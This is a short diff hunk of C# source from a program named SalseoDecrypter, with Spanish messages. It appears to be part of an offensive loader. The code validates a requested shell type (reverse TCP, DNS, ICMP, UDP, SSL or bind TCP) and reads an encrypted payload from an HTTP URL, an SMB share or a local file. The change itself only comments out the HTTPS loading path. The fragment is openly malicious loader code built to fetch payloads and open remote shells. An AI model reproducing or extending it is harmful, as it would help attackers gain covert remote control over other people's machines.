@@ -115,7 +115,7 @@ namespace SalseoDecrypter
             if (funcion != "reversetcp" & funcion != "reversedns" & funcion != "reverseicmp" & funcion != "reverseudp" & funcion != "bindtcp" & funcion != "reversessl") { Console.WriteLine("\n[-] Error en el tipo de shell :("); Environment.Exit(1); }
             Console.ForegroundColor = ConsoleColor.Gray;
             if (args[1].ToString().Substring(0, 5).ToLower() == "http:") { Salseo_Encriptado = ClienteWeb.LeePayload(args[1].ToString()); }
-            if (args[1].ToString().Substring(0, 5).ToLower() == "https") { Salseo_Encriptado = ClienteWebhttps.LeePayload(args[1].ToString()); }
+            //if (args[1].ToString().Substring(0, 5).ToLower() == "https") { Salseo_Encriptado = ClienteWebhttps.LeePayload(args[1].ToString()); }
             if (args[1].ToString().Substring(0, 2).ToLower() == "\\\\") { Console.WriteLine("[+] Leyendo datos via SMB..."); if (System.IO.File.Exists(Salseo_URL) == false) { Console.WriteLine("[-] Error: No se pudo leer el payload ¿ La ruta es correcta ?"); Environment.Exit(1); } Salseo_Encriptado = LeeArchivoSMBorLocal.Archivo(args[1].ToString()); }
             if (args[1].ToString().Substring(0, 4).ToLower() != "http" && args[1].ToString().Substring(0, 2).ToLower() != "\\\\") { Console.WriteLine("[+] Leyendo datos via LOCAL..."); if (System.IO.File.Exists(Salseo_URL) == false) { Console.WriteLine("[-] Error: No se pudo leer el payload ¿ La ruta es correcta ?"); Environment.Exit(1); } Salseo_Encriptado = LeeArchivoSMBorLocal.Archivo(args[1].ToString()); }
             //#############################################################
